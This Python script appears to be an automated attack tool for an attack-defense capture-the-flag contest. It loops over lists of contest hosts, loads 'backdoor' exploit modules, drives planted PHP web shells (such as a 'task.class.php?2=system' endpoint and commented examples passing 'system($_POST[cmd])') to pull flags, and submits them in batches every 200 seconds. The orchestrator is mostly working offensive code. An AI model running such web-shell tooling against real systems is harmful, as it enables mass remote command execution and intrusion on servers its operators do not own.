#coding:utf-8
from module.submit_flag import *
from fake_requests import *
from module.tool import log_success , log_fail , log_info , log_split , get_exp_path , get_host_port
import traceback
import importlib

debug = False
wait_time = 200 # s


	# conf 
conf_Dict_List = [
    {
        "name": "HDwiki",  # web项目的唯一名字
        "url_list": ["http://172.16.5.{}:5050/".format(i) for i in range(11 , 15)],  # 根据 比赛时规则生成对应的 url 列表
        "exp": "backdoor",
        "arguments": {"root": "/var/www/html/8081", "key": "HDwiki", "type": "code"}
        # web shell的种类， eval # code | system # shell
    },{
        "name": "HDwiki_backdoor2",  # web项目的唯一名字
        "url_list": ["http://172.16.5.{}:5050/model/task.class.php?2=system".format(i) for i in range(11, 15)],  # 根据 比赛时规则生成对应的 url 列表
        "exp": "backdoor",
        "arguments": {"root": "n/var/www/html/8081", "key": "1", "type": "shell"}
    # web shell的种类， eval # code | system # shell
    }

    # {
    #     "name"      : "webphp1", # web项目的唯一名字
    #     "url_list"  : ["http://192.168.75.134/evil.php" , "http://192.168.75.135/evil2.php"], # 根据 比赛时规则生成对应的 url 列表
    #     "exp"       : "backdoor",
    #     "arguments" : {"root" : "/var/www/html" , "key":"cmd" , "type" : "code" } # web shell的种类， eval # code | system # shell
    # },
    # {
    #     "name"      : "webphp2", # web项目的唯一名字
    #     "url_list"  : ["http://192.168.75.134/ecshop/aa.php?1=system($_POST[cmd]);"], # 根据 比赛时规则生成对应的 url 列表
    #     "exp"       : "backdoor",
    #     "arguments" : { "root" : "/var/www/html/" ,"key":"cmd" , "type" : "shell" } # web shell的种类， eval # code | system # shell
    # },
    # {
    #     "name"      : "dvwa", # web项目的唯一名字
    #     "url_list"  : ["http://140.143.0.200:81/evil.php"], # 根据 比赛时规则生成对应的 url 列表
    #     "exp"       : "backdoor",
    #     "arguments" : {"root" : "/var/www/html/" ,"key":"a" , "type" : "code" } # web shell的种类， eval # code | system # shell
    # }
]

if __name__ == "__main__":
    while True:
        flag_dict = {}
        for conf in conf_Dict_List:
            exp_name = conf['exp']
            # check target file whether exist
            exp_path = get_exp_path(exp_name)

            if os.path.exists( exp_path ) is False:
                log_fail("{} 不存在目标 exp.py".format(conf["name"]))
                continue # pass this turn
            # 导入指定 exp 函数 ， 生成函数对象
            exp_func_module_spec = importlib.util.spec_from_file_location(exp_name, exp_path)
            exp_func_module = importlib.util.module_from_spec(exp_func_module_spec)
            exp_func_module_spec.loader.exec_module(exp_func_module)

            # break
            # exp_func_module = imp.load_source("".join(["exp" , exp_name , "exp"]), exp_path)
            try:
                exp_func = exp_func_module.__getattribute__("exp")
            except Exception as e:
                log_fail("{}'s exp.py 不存在 exp 函数".format(conf['name']))
                continue # pass this turn
            # 遍历 url_list
            for url in conf['url_list']:
                try:
                    flag = exp_func(url, name = conf['name'] , **conf['arguments']) # flag # None 预期执行错误 # string flag本体,要求截取网页内容
                except Exception as e:
                    log_fail( "{} exp 执行报错".format(exp_name))
                    log_info(e)
                    if debug is True:
                        traceback.print_exc()
                    flag = None # unexcepted error # 未预期的执行错误
                if flag != None: # 获取 flag 成功
                    host, port = get_host_port(url) # 获取 url 的 host , port # 为 flag_dict 做准备
                    flag_key = "{}|{}".format(host , port)
                    if flag_dict.get(flag_key) == None: # init flag_dict[flag_key]
                        flag_dict[flag_key] = []
                    flag_dict[flag_key].append(flag)
                    log_success( "{} conf : {}'flag => {}".format(conf['name'] , url , flag))
                log_info("============== > conf url split")
            log_split()

        #exp 执行完毕 , 批量提交 flag
        for flag_key , flag_list in flag_dict.items():
            flag_list = list(set(flag_list))
            log_info("==========> {}'s flag_set : {}".format(flag_key, str(flag_list)))
            for flag in flag_list:
                bRet = submit_flag(flag_key , flag)
                if bRet is True:
                    log_success("{}'s flag submit_success ==> {} ".format(flag_key, flag))
                    break # 某一个服务 提交flag 成功 ， 剩余flag无视

        sleep(wait_time)


